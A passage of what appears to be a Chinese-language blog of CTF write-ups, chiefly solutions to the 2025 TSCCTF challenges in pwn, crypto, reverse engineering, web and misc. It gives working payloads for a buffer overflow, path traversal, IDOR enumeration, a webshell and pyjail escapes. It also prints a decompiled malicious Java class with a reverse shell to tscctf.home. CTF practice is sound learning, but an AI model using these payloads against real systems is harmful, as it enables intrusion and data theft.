看到\n\n\nImage\n\n到 [robots.txt](https://mid.ctf.scist.org/robots.txt)\n看到\nUser-agent: *Disallow: /adminDisallow:/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==\n進到 /cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg== 發現\nflag.addEventListener(\"click\", function() {    alert(\"E.1O9_w3lc0mE}\");});\n找到第二段 flag E.1O9_w3lc0mE} ，就成功ㄌ\nflag: SCIST{c0Ns01E.1O9_w3lc0mE}\n","categories":["資安","CTF"],"tags":["資安","CTF","TSCCTF","Writeup"]},{"title":"2025 TSCCTF Writeup","url":"/2025_TSCCTF_Writeup/","content":"在 Qualified Scoreboard 第五，全部人的第 41，嗚嗚被虐爛了\n\n\nQualified Scoreboard\n\n\n\nOverall Scoreboard\n\n\nWelcome \nGive you a free flag \n把底下反白就出現了\n\n\nimage\n\nflag: TSC{W3llc0me_t0_TSC2O2SIlIllI}\nPlease Join Our Discord!!! \n在 DC 翻一翻就找到了 OuO 但我看到去年的交了大概 20 幾筆錯的 flag\nw\n\n\nimage\n\nflag: TSC{w31c0m3_t0_t5cc7f2025_d15c0rd!!!}\nFeedback Form \n就填表單\n\n\nimage\n\nflag: TSC{thanks_for_playing_and_c_u_nexy_year!}\nPwn \ngamble_bad_bad \n為了讓 strcmp(game.jackpot_value, \"777\") == 0 成立，用\nBuffer Overflow\n輸入: AAAAAAAAAAAAAAAAAAAA777\nflag: TSC{Gamb1e_Very_bad_bad_but_}\nCrypto \nVery Simple Login \nimport base64import hashlibimport jsonimport osimport reimport sysimport timefrom secret import FLAGdef xor(message0: bytes, message1: bytes) -&gt; bytes:    return bytes(byte0 &amp; byte1 for byte0, byte1 in zip(message0, message1))def sha256(message: bytes) -&gt; bytes:    return hashlib.sha256(message).digest()def hmac_sha256(key: bytes, message: bytes) -&gt; bytes:    blocksize = 64    if len(key) &gt; blocksize:        key = sha256(key)    if len(key) &lt; blocksize:        key = key + b'\\x00' * (blocksize - len(key))    o_key_pad = xor(b'\\x5c' * blocksize, key)    i_key_pad = xor(b'\\x3c' * blocksize, key)    return sha256(o_key_pad + sha256(i_key_pad) + message)def sha256_jwt_dumps(data: dict, exp: int, key: bytes):    header = {'alg': 'HS256', 'typ': 'JWT'}    payload = {'sub': data, 'exp': exp}    header = base64.urlsafe_b64encode(json.dumps(header).encode())    payload = base64.urlsafe_b64encode(json.dumps(payload).encode())    signature = hmac_sha256(key, header + b'.' + payload)    signature = base64.urlsafe_b64encode(signature).rstrip(b'=')    return header + b'.' + payload + b'.' + signaturedef sha256_jwt_loads(jwt: bytes, exp: int, key: bytes) -&gt; dict | None:    header_payload, signature = jwt.rsplit(b'.', 1)    sig = hmac_sha256(key, header_payload)    sig = base64.urlsafe_b64encode(sig).rstrip(b'=')    if sig != signature:        raise ValueError('JWT error')    try:        header, payload = header_payload.split(b'.')[0], header_payload.split(b'.')[-1]        header = json.loads(base64.urlsafe_b64decode(header))        payload = json.loads(base64.urlsafe_b64decode(payload))        if (header.get('alg') != 'HS256') or (header.get('typ') != 'JWT'):            raise ValueError('JWT error')        if int(payload.get('exp')) &lt; exp:            raise ValueError('JWT error')    except Exception:        raise ValueError('JWT error')    return payload.get('sub')def register(username: str, key: bytes):    if re.fullmatch(r'[A-z0-9]+', username) is None:        raise ValueError(\"'username' format error.\")    return sha256_jwt_dumps({'username': username}, int(time.time()) + 86400, key)def login(token: bytes, key: bytes):    userdata = sha256_jwt_loads(token, int(time.time()), key)    return userdata['username']def menu():    for _ in range(32):        print('==================')        print('1. Register')        print('2. Login')        print('3. Exit')        try:            choice = int(input('&gt; '))        except Exception:            pass        if 1 &lt;= choice &lt;= 3:            return choice        print('Error choice !', end='\\n\\n')    sys.exit()def main():    key = os.urandom(32)    for _ in range(32):        choice = menu()        if choice == 1:            username = input('Username &gt; ')            try:                token = register(username, key)            except Exception:                print('Username Error !', end='\\n\\n')                continue            print(f'Token : {token.hex()}', end='\\n\\n')        if choice == 2:            token = bytes.fromhex(input('Token &gt; '))            try:                username = login(token, key)            except Exception:                print('Token Error !', end='\\n\\n')            if username == 'Admin':                print(f'FLAG : {FLAG}', end='\\n\\n')                sys.exit()            else:                print('FLAG : TSC{???}', end='\\n\\n')        if choice == 3:            sys.exit()if __name__ == '__main__':    try:        main()    except Exception:        sys.exit()    except KeyboardInterrupt:        sys.exit()\n程式裡沒有檢查或限制使用者是否能以 “Admin” 作為帳號，因此只要註冊\n“Admin” 並成功獲得 Token，再使用該 Token 進行登入就可以得到 FLAG。\nflag: TSC{Wr0nG_HM4C_7O_L3A_!!!}\nClassic \nimport osimport stringimport secretsflag = os.getenv(\"FLAG\") or \"TSC{test_flag}\"charset = string.digits + string.ascii_letters + string.punctuationA, B = secrets.randbelow(2**32), secrets.randbelow(2**32)assert len(set((A * x + B) % len(charset) for x in range(len(charset)))) == len(charset)enc = \"\".join(charset[(charset.find(c) * A + B) % len(charset)] for c in flag)print(enc)\n加密後的 flag : o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV\"\n加密方法\ncharset = string.digits + string.ascii_letters + string.punctuationA, B = secrets.randbelow(2**32), secrets.randbelow(2**32)assert len(set((A * x + B) % len(charset) for x in range(len(charset)))) == len(charset)enc = \"\".join(charset[(charset.find(c) * A + B) % len(charset)] for c in flag)\n已知：\n\nT-&gt;o : (55 * A + B) % 94 = 24\nS-&gt;` : (54 * A + B) % 94 = 89\nC-&gt;1 : (38 * A + B) % 94 = 1\n{-&gt;5 : (90 * A + B) % 94 = 5\n}-&gt;” : (92 * A + B) % 94 = 63\n\n從前兩個可以知道：1 * A % 94 = 24-89 = -65 = 29\n用後兩個驗證一下：2 * A % 94 = 63-5 = 58\n可以直接假設 A = 29 \\(\\rightarrow\\)\n(55 * A + B) % 94 = (91 + B) % 94 = 24 \\(\\rightarrow\\) 假設 B = 27\n驗證一下 (92 * 29 + 27) % 94 = 63 沒錯\n接著就\nIn [50]: for c in enc:    ...:     for i in range(94):    ...:         if ((i*A + B) % 94 == charset.find(c)):    ...:             print(charset[i], end=\"\")    ...: TSC{c14551c5_c1ph3r5_4r5_fr4g17e}\nflag: TSC{c14551c5_c1ph3r5_4r5_fr4g17e}\n2DES \n#!/usr/bin/env pythonfrom Crypto.Cipher import DESfrom Crypto.Util.Padding import padfrom random import choicefrom os import urandomfrom time import sleepdef encrypt(msg: bytes, key1, key2):    des1 = DES.new(key1, DES.MODE_ECB)    des2 = DES.new(key2, DES.MODE_ECB)    return des2.encrypt(des1.encrypt(pad(msg, des1.block_size)))def main():    flag = open('/flag.txt', 'r').read().strip().encode()    print(\"This is a 2DES encryption service.\")    print(\"But you can only control one of the key.\")    print()    while True:        print(\"1. Encrypt flag\")        print(\"2. Decrypt flag\")        print(\"3. Exit\")        option = int(input(\"&gt; \"))        if option == 1:            # I choose a key            # You can choose another one            keyset = [\"1FE01FE00EF10EF1\", \"01E001E001F101F1\", \"1FFE1FFE0EFE0EFE\"]            key1 = bytes.fromhex(choice(keyset))            key2 = bytes.fromhex(input(\"Enter key2 (hex): \").strip())            ciphertext = encrypt(flag, key1, key2)            print(\"Here is your encrypted flag:\", flush=True)            print(\"...\", flush=True)            sleep(3)            if ciphertext[:4] == flag[:4]:                print(ciphertext)                print(\"Hmmm... What a coincidence!\")            else:                print(\"System error!\")            print()        elif option == 2:            print(\"Decryption are disabled\")            print()        elif option == 3:            print(\"Bye!\")            exit()        else:            print(\"Invalid option\")            print()if __name__ == \"__main__\":    main()\n題目是會把 flag 用 DES 加密兩次，第一次是會隨機選擇\n[\"1FE01FE00EF10EF1\", \"01E001E001F101F1\", \"1FFE1FFE0EFE0EFE\"]\n其中一組當作金鑰加密，第二次加密的金鑰可以自己設定，於是我就想到了\n半弱金鑰\n，查了以下這樣的東西，發現三個都是半弱金鑰，我就拿一個去試了，然後就得到\nflag 了 /\n\n0x011F011F010E010E and 0x1F011F010E010E01\n0x01E001E001F101F1 and 0xE001E001F101F101\n0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01\n0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E\n0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E\n0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1\n\n1. Encrypt flag2. Decrypt flag3. Exit&gt; 1Enter key2 (hex): E01FE01FF10EF10EHere is your encrypted flag:...b'TSC{th3_Key_t0_br34k_DES_15_tHe_keY}\\x04\\x04\\x04\\x04'Hmmm... What a coincidence!\nflag: TSC{th3_Key_t0_br34k_DES_15_tHe_keY}\n我從來都不覺得算密碼學開心過 \nfrom Crypto.Util.number import getPrime, long_to_bytesfrom Crypto.Util.Padding import padfrom Crypto.Cipher import AESfrom random import randrangeflag = open('flag.txt', 'r').read().strip().encode()p = getPrime(16)r = [randrange(1, p) for _ in range(5)]print(f'p = {p}')# You have 5 unknown random numbers# But you can only get 4 hashes# It is impossible to recover the flag, right?for i in range(4):    h = flag[i]    for j in range(5):        h = (h + (j+1) * r[j]) % p        r[j] = h    print(f\"hash[{i}] = {h}\")key = 0for rr in r:    key += rr    key *= 2**16key = pad(long_to_bytes(key), 16)aes = AES.new(key, AES.MODE_ECB)ciphertext = aes.encrypt(pad(flag, AES.block_size))print(f\"ciphertext = {ciphertext}\")\n簡單來說就是他有 r0~r4\n五個未知數，但是他只有四個取模的等式，所以我們枚舉其中一項，就能推出剩下四項，然後帶去解\nAES 看解不解的出來，解出來就對了，但是實際上那個等式超醜，我是用\nGeogebra 算，還是算了好一陣子才寫出正確的等式，如下\n\\[\n\\begin{cases}\nr_0 + 2r_1 + 3r_2 + 4r_3 + 5r_4 + 84 \\equiv 1934 \\pmod{42899} \\\\\n15r_0 + 28r_1 + 36r_2 + 36r_3 + 25r_4 + 1343 \\equiv 22627 \\pmod{42899}\n\\\\\n140r_0 + 250r_1 + 291r_2 + 244r_3 + 125r_4 + 13072 \\equiv 36616\n\\pmod{42899} \\\\\n1050r_0 + 1820r_1 + 1980r_2 + 1476r_3 + 625r_4 + 100948 \\equiv 21343\n\\pmod{42899}\n\\end{cases}\n\\]\n然後叫 ChatGPT 幫我寫個求解的程式碼，然後就依依帶入驗證就可以得到\nFlag 了\nfrom sympy import Matrixfrom Crypto.Util.number import getPrime, long_to_bytesfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESfrom random import randrangep = 42899hashes = [1934, 22627, 36616, 21343]ciphertext = b'z\\xa5\\xa5\\x1d\\xe5\\xd2I\\xb1\\x15\\xec\\x95\\x8b^\\xb6:r=\\xe3h\\x06-\\xe9\\x01\\xda\\xc03\\xa4\\xf6\\xa8_\\x8c\\x12!MZP\\x17O\\xee\\xa3\\x0f\\x05\\x0b\\xea7cnP'good = 0for r4 in range(p):    A = Matrix([        [1,  2,  3,  4],        [15, 28, 36, 36],        [140, 250, 291, 244],        [1050,1820,1980,1476]    ])    B = []    def mod_sub(a, b): return (a - b) % p        B.append(mod_sub(hashes[0], 5*r4 + 84))    B.append(mod_sub(hashes[1], 25*r4 + 1343))    B.append(mod_sub(hashes[2], 125*r4 + 13072))    B.append(mod_sub(hashes[3], 625*r4 + 100948))    # Solve in modular arithmetic    # sympy's solve for modular is not direct; try invert or reduce:    M = A.det() % p    if M == 0:        continue    try:        invA = A.inv_mod(p)    except:        continue    sol = invA * Matrix(B)    r0, r1, r2, r3 = [int(x) % p for x in sol]    r = [r0, r1, r2, r3, r4]    flag = 'TSC{}'.encode()    for i in range(4):        h = flag[i]        for j in range(5):            h = (h + (j+1) * r[j]) % p            r[j] = h    key = 0    for rr in r:        key += rr        key *= 2**16        key = pad(long_to_bytes(key), 16)    aes = AES.new(key, AES.MODE_ECB)    try:        decrypted = aes.decrypt(ciphertext).decode()        if decrypted.startswith('TSC{'):            print(decrypted)            print(r0, r1, r2, r3, r4)            break    except:        pass\nflag: TSC{d0_4_L1feTim3_0f_crypTogr4phy_w1th_yOu}\nReverse \nWhat_Happened \n用 gdb 得到了者個咚咚\n(gdb) x/s &amp;flag_encrypted0x405064 &lt;flag_encrypted&gt;:      \"\\376\\371\\351\\321\\343\\365\\376\\302\\303\\304\\301\\365\\323\\305\\337\\365\\354\\303\\322\\365\\230\\305\\307\\317\\365\\231\\330\\330\\305\\330\\327Decrypted Flag: %s\\n\"\n然後看了一下 decrypt 的邏輯\n(gdb) disassemble decrypt_flagDump of assembler code for function decrypt_flag:   0x004014af &lt;+0&gt;:     push   %ebp   0x004014b0 &lt;+1&gt;:     mov    %esp,%ebp   0x004014b2 &lt;+3&gt;:     sub    $0x58,%esp   0x004014b5 &lt;+6&gt;:     movl   $0x405064,(%esp)   0x004014bc &lt;+13&gt;:    call   0x403b28 &lt;strlen&gt;   0x004014c1 &lt;+18&gt;:    mov    %eax,-0x10(%ebp)   0x004014c4 &lt;+21&gt;:    movl   $0x0,-0xc(%ebp)   0x004014cb &lt;+28&gt;:    jmp    0x4014eb &lt;decrypt_flag+60&gt;   0x004014cd &lt;+30&gt;:    mov    -0xc(%ebp),%eax   0x004014d0 &lt;+33&gt;:    add    $0x405064,%eax   0x004014d5 &lt;+38&gt;:    movzbl (%eax),%eax   0x004014d8 &lt;+41&gt;:    xor    $0xffffffaa,%eax   0x004014db &lt;+44&gt;:    mov    %eax,%ecx   0x004014dd &lt;+46&gt;:    lea    -0x42(%ebp),%edx   0x004014e0 &lt;+49&gt;:    mov    -0xc(%ebp),%eax   0x004014e3 &lt;+52&gt;:    add    %edx,%eax   0x004014e5 &lt;+54&gt;:    mov    %cl,(%eax)   0x004014e7 &lt;+56&gt;:    addl   $0x1,-0xc(%ebp)   0x004014eb &lt;+60&gt;:    mov    -0xc(%ebp),%eax   0x004014ee &lt;+63&gt;:    cmp    -0x10(%ebp),%eax   0x004014f1 &lt;+66&gt;:    jl     0x4014cd &lt;decrypt_flag+30&gt;   0x004014f3 &lt;+68&gt;:    lea    -0x42(%ebp),%edx   0x004014f6 &lt;+71&gt;:    mov    -0x10(%ebp),%eax   0x004014f9 &lt;+74&gt;:    add    %edx,%eax   0x004014fb &lt;+76&gt;:    movb   $0x0,(%eax)   0x004014fe &lt;+79&gt;:    lea    -0x42(%ebp),%eax   0x00401501 &lt;+82&gt;:    mov    %eax,0x4(%esp)   0x00401505 &lt;+86&gt;:    movl   $0x405083,(%esp)--Type &lt;RET&gt; for more, q to quit, c to continue without paging--c   0x0040150c &lt;+93&gt;:    call   0x403b60 &lt;printf&gt;   0x00401511 &lt;+98&gt;:    nop   0x00401512 &lt;+99&gt;:    leave   0x00401513 &lt;+100&gt;:   retEnd of assembler dump.\n可是我看不懂，不過 ChatGPT 跟我說他是把每個字拿去跟 0x44\nxor 的結果，試了一下就得到 flag 了\nencrypted_flag = [    0xFE, 0xF9, 0xE9, 0xD1, 0xE3, 0xF5, 0xFE, 0xC2, 0xC3, 0xC4,    0xC1, 0xF5, 0xD3, 0xC5, 0xDF, 0xF5, 0xEC, 0xC3, 0xD2, 0xF5,    0x98, 0xC5, 0xC7, 0xCF, 0xF5, 0x99, 0xD8, 0xD8, 0xC5, 0xD8,    0xD7]key = 0xAAdecrypted_flag = ''.join(chr(byte ^ key) for byte in encrypted_flag)print(decrypted_flag)\nflag: TSC{I_Think_you_Fix_2ome_3rror}\nGateway to the Reverse \n隨便亂帶工具試試看，我根本不會 Reverse 就出 flag 了\n$ ltrace ./gateputs(\"================================\"...=============================================)                                                                                   = 46puts(\"You stand before the Gate of the\"...You stand before the Gate of the Reverse World.)                                                                                   = 48puts(\"A voice echoes from the darkness\"...A voice echoes from the darkness:)                                                                                   = 35puts(\"  \"Beyond this gate lies the Rev\"...  \"Beyond this gate lies the Reverse World, a realm)                                                                                   = 52puts(\"   of infinite knowledge and unt\"...   of infinite knowledge and untold secrets.)                                                                                   = 45puts(\"   But only those who can deciph\"...   But only those who can decipher the key may enter.\")                                                                                   = 56puts(\"The gatekeeper continues:\"The gatekeeper continues:)                                                                                             = 26puts(\"  \"Reveal today's lucky number, \"...  \"Reveal today's lucky number, and the gate shall open.\")                                                                                   = 58puts(\"================================\"...=============================================)                                                                                   = 46printf(\"\\nEnter the access key: \")                                                                                            = 23__isoc99_scanf(0x562eca2c637c, 0x7ffc3c3130b0, 0, 0x562eca2c637bEnter the access key: sadfsd)                                                             = 1strlen(\"NL=rje+fS&amp;eVP!RdK\\177=e;{y6CG4Aif\")                                                                                   = 30strcmp(\"sadfsd\", \"TSC{th1s_1s_b4by_r3v3rs3_b4by}\")                                                                            = 31puts(\"  +===========================+\"  +===========================+)                                                                                       = 32puts(\"  ||                         ||\"  ||                         ||)                                                                                       = 32puts(\"  ||      [  LOCKED  ]       ||\"  ||      [  LOCKED  ]       ||)                                                                                       = 32puts(\"  ||                         ||\"  ||                         ||)                                                                                       = 32puts(\"  ||   The gate remains      ||\"  ||   The gate remains      ||)                                                                                       = 32puts(\"  ||       firmly shut.      ||\"  ||       firmly shut.      ||)                                                                                       = 32puts(\"  ||                         ||\"  ||                         ||)                                                                                       = 32puts(\"  +===========================+\"  +===========================+)                                                                                       = 32puts(\"       ||             ||\"       ||             ||)                                                                                              = 25puts(\"       ||             ||\"       ||             ||)                                                                                              = 25puts(\"       ||             ||\"       ||             ||)                                                                                              = 25puts(\"       ||             ||\"       ||             ||)                                                                                              = 25puts(\"       ||             ||\"       ||             ||)                                                                                              = 25puts(\"       ||             ||\"       ||             ||)                                                                                              = 25puts(\"The gatekeeper's voice booms:\"The gatekeeper's voice booms:)                                                                                         = 30puts(\"  \"Your answer is incorrect. The\"...  \"Your answer is incorrect. The gate shall remain closed.\")                                                                                   = 60puts(\"  \"Return when you have decipher\"...  \"Return when you have deciphered the true key.\")                                                                                   = 50+++ exited (status 0) +++\nflag: TSC{th1s_1s_b4by_r3v3rs3_b4by}\nWeb \nAve Mujica \n發現這題可以在 /image?name= Path Traversal 試了很久，在\n../../../proc/self/environ 找到了 Flag\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=acfe70c044b5FLAG=TSC{敬愛爽🍷}LANG=C.UTF-8GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305PYTHON_VERSION=3.12.8PYTHON_SHA256=c909157bb25ec114e5869124cc2a9c4a4d4c1e957ca4ff553f1edc692101154eHOME=/root\nflag: TSC{敬愛爽🍷}\nBe_IDol \n檢查之後發現裡面有個後門\n// Backdoor function - ez_login()function ez_login() {\tdocument.cookie = \"PHPSESSID=secretbackdoor123\";\tlocation.reload();}\n就在 console 中打 ex_login() 之後就到了\nhttp://172.31.0.2:8057/index.php 發現有很多檔案可以下載\n\n\nimage\n\n通靈試試看上面沒有的 ID\n$ curl http://172.31.0.2:8057/download.php\\?file_id\\=11001database:  host: localhost  user: admin  password: [REDACTED]\n發現了非預期的結果，於是我叫 GPT 寫了個程式幫我遍歷 id = 10000~20000\n的所有檔案，如果回傳結果不是 This is a normal file with ID:\n或 File not found 為開頭就列出來\nimport requests# 定義 URL 和檔案 ID 範圍base_url = \"http://172.31.0.2:8057/download.php\"start_id = 10000end_id = 20000# 記錄非預期回應unexpected_responses = {}# 開始嘗試下載for file_id in range(start_id, end_id + 1):    params = {\"file_id\": file_id}    try:        response = requests.get(base_url, params=params)        if response.status_code == 200:            content = response.text            # 過濾預期內容            if not (content.startswith(\"This is a normal file with ID:\") or \"File not found\" in content):                print(f\"[{file_id}] 非預期內容\")                print(content)                unexpected_responses[file_id] = content    except Exception as e:        print(f\"[{file_id}] 請求失敗: {e}\")\n發現了可能最怪的東東是\n[12001] 非預期內容        &lt;!DOCTYPE html&gt;        &lt;html&gt;        &lt;head&gt;            &lt;title&gt;System Command Interface&lt;/title&gt;            &lt;style&gt;                body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }                pre { background: #2d2d2d; padding: 10px; border-radius: 5px; }                .output { margin-top: 10px; }            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;h2&gt;System Command Interface&lt;/h2&gt;            &lt;form method=\"GET\"&gt;                &lt;input type=\"hidden\" name=\"file_id\" value=\"12001\"&gt;                Command: &lt;input type=\"text\" name=\"cmd\" style=\"width: 300px;\" value=\"\"&gt;                &lt;input type=\"submit\" value=\"Execute\"&gt;            &lt;/form&gt;            &lt;div class=\"output\"&gt;                &lt;pre&gt;Try some commands:ls -lapwdcat /etc/passwd&lt;/pre&gt;            &lt;/div&gt;        &lt;/body&gt;        &lt;/html&gt;\n於是我就到\nhttp://172.31.0.2:8057/download.php?file_id=12001\n發現好像是個 WebShell ，然後隨便找找就發現 flag 了 /\n\n\nimage\n\nflag:\nTSC{You_can_be_ID0R_12353oujhefrgiuoewihoqweihfo}\nMisc \nSubdomain Hijacking \n就隨便亂生成一些 subdomain\n，發現好像只有開頭字母會引響生成的結果，所以就從 a 試到 z 看看，試到 t\n的時候發現他變大寫了？ 趕快拿去試試，就發現得到 flag 了\n\n\nimage\n\n\n\nimage\n\nflag:\nTSC{hijacking_success_f5a0651d788f466ba0e5e707ebf00f4d}\nBabyJail \nprint(eval(input('&gt; '), {\"__builtins__\": {}}, {}))\n{\"__builtins__\": {}}\n會移除所有內建函數，試著從能執行系統命令的類別下手，利用\n''.__class__.__base__.__subclasses__() 發現有個\n&lt;class 'os._wrap_close'&gt; 能利用一下，就搓出了以下的\npayload 成功得到 flag\nnc 172.31.3.2 8002&gt; ''.__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('cat flag*')TSC{just_a_classic_nobuiltins_pyjail_for_baby}\nflag: TSC{just_a_classic_nobuiltins_pyjail_for_baby}\ncalc \n參考了 Pyjail\nCheatSheet 的 Unicode Bypass 自己修改蠻久一下，就成功造出一個 shell\n了\npayload:\n(𝘥:=()._＿𝘥𝘰𝘤＿_,𝘥:=()._＿𝘥𝘪𝘳＿_().__𝘤𝘭𝘢𝘴𝘴__(𝘥),𝘴:=𝘥.𝘱𝘰𝘱(19),𝘥._＿𝘤𝘭𝘢𝘴𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_).𝘱𝘰𝘱(1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().𝘱𝘰𝘱(121).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.𝘱𝘰𝘱(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.𝘱𝘰𝘱(54)))\nP.S. 不知道為什麼這坨如果一次複製直接貼上有些字會變成 (U + FFFD)\n，但如果分批複製就不會 w\nflag:\nTSC{PEP-3131_is_a_friendly_PEP_for_pyjai1er_nhsdcuhq6}\n補題區 \nMisc - A Minecraft SOC Mission\n\n這題其實賽中就有做出來了，但 flag 格式搞錯了 啊啊啊啊啊，與 388\n分失之交臂\n把下載的 Evil.class 拿去反編譯 (可以用這個)，就會得到\nimport java.util.Base64;public class Evil extends ClassLoader {   private static final String[] $ = new String[]{\"QTlXNHY2eXVpPQ==\", \"WVcxdmJtY3NJR0Z1WkNCemJ5QnBjeUJwZENCbGVHVmpkWFJwYm1jPQ==\", \"ZEhOalpYUm1MbWh2YldVPQ==\"};   private static String ᅟ = \"k9\";   private static int ㅤ = 1017;   private void ᅠ(byte[] var1) {      try {         String[] var2 = (new String(Base64.getDecoder().decode($[1]))).split(\",\");         new String(Base64.getDecoder().decode($[2]));         String var4 = (String)Class.forName(\"java.lang.System\").getMethod(\"getProperty\", String.class).invoke((Object)null, var2[0]);         boolean var5 = var4.toLowerCase().contains(var2[1]);         String[] var10000;         if (var5) {            var10000 = new String[]{\"cmd.exe\", \"/c\", null};            String var10003 = new String(new byte[]{112, 111, 119, 101, 114, 115, 104, 101, 108, 108, 32, 45, 101, 32});            var10000[2] = var10003 + \"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAdABzAGMAYwB0AGYALgBoAG8AbQBlACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\";         } else {            var10000 = new String[]{\"/bin/bash\", \"-c\", this.ㅤㅤ(new String[]{\"echo\", \"YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==\", \"base64\", \"-d\", \"bash\"})};         }         String[] var6 = var10000;         Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String[].class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke((Object)null), var6);      } catch (Exception var7) {      }   }   private String ㅤㅤ(String[] var1) {      StringBuilder var2 = new StringBuilder();      for(int var3 = 0; var3 &lt; var1.length; ++var3) {         var2.append(var1[var3]);         if (var3 &lt; var1.length - 1) {            var2.append(\" | \");         }      }      return var2.toString();   }   static {      (new Evil()).ᅠ(new byte[0]);   }}\n把一些看起來像 base64 過的東西解密後就知道他是一個執行 reverse shell\n的程式\nbash -i &gt;&amp; /dev/tcp/tscctf.home/443 0&gt;&amp;1\n，然後要交的東西就是 tscctf.home 了，原本還在想要怎麼找到\nip 還用 tscctf{} 包起來，沒想到這麼簡單嗚嗚\nflag: tscctf.home\n","categories":["資安","CTF"],"tags":["資安","CTF","TSCCTF","Writeup"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day30","url":"/IThome_2024ironman_CTF_Day30/","content":"前言 \n三十天了！ 今天就寫六題 Crypto 的 Writeup ，最後再來個小小總結\n\nWriteup \n第一題：rsa_oracle \n這題要利用 RSA 模運算中乘的性質解出這題\n\\[c = m^e \\mod n\\]\n\\[m = c^d \\mod n\\]\n\\[(a \\cdot b) \\mod n = ((a \\mod n) \\cdot (b\n\\mod n)) \\mod n\\]\n\\[m_1*m_2 = (c_1^d \\mod n) \\cdot (c_2^d \\mod\nn) = (c_1^d \\cdot c_2^d) \\mod n = (c_1 \\cdot c_2)^d \\mod n\\]\n我們可將 \\(c_1\\)\n設為題目給的密碼，\\(c_2\\)\n自己設一個數字，就能藉由 \\(c_2\\) 和\n\\(c_1*c_2\\) 的解密結果，推出 \\(c_1\\)\n的明文，也就是用來解密用的密碼，再根據提示利用 openssl 解出 flag。\nIn [1]: from Crypto.Util.number import *In [2]: from pwn import *In [3]: io = remote(\"titan.picoctf.net\", 59764)[x] Opening connection to titan.picoctf.net on port 59764[x] Opening connection to titan.picoctf.net on port 59764: Trying 3.139.174.234[+] Opening connection to titan.picoctf.net on port 59764: DoneIn [4]: io.sendline(b\"E\")In [5]: io.sendline(b\"\\x02\")In [6]: io.recv()Out[6]: b'*****************************************\\n****************THE ORACLE***************\\n*****************************************\\nwhat should we do for you? \\nE --&gt; encrypt D --&gt; decrypt. \\nenter text to encrypt (encoded length must be less than keysize): \\x02\\n\\nencoded cleartext as Hex m: 2\\n\\nciphertext (m ^ e mod n) 5067313465613043651275429665315895824157755779222372979446076012356324498190828210335763979330272318657269048435311897896433721115606764442199497891219230\\n\\nwhat should we do for you? \\nE --&gt; encrypt D --&gt; decrypt. \\n'In [7]: c2 = 5067313465613043651275429665315895824157755779222372979446076012356324498190828210335763979330272318657   ...: 269048435311897896433721115606764442199497891219230In [8]: c = 17650370497640477243481146344736587348304908520660613456869163656586181949810972167509294217348129116804   ...: 34647401939068526285652985802740837961814227312100In [9]: io.sendline(b\"D\")In [10]: io.sendline(str(c2*c).encode())In [11]: io.recv()Out[11]: b'Enter text to decrypt: decrypted ciphertext as hex (c ^ d mod n): 707062c872\\ndecrypted ciphertext: 